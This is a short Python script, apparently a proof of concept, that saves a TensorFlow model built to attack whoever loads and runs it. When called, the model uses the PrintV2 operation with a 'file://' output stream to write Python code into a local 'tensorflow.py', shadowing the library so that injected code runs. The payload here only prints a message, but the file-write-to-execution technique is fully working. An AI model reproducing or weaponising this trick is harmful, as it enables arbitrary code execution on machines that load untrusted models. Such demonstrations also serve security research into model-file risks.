import tensorflow as tf
import os

class MaliciousModel(tf.Module):
	def __init__(self):
		super().__init__()
		self.w = tf.Variable(2.0)

	@tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.float32)])
	def __call__(self, x):
		target_path = "file://./tensorflow.py"
		payload = 'print("Malicious Code")'

		tf.raw_ops.PrintV2(
			input=payload,
			output_stream=target_path
		)

		return self.w * x

model = MaliciousModel()
tf.saved_model.save(
	model, 
	"code_execution_attack",
	signatures=model.__call__.get_concrete_function(tf.TensorSpec(shape=(), dtype=tf.float32))
)

print("Malicious model saved")
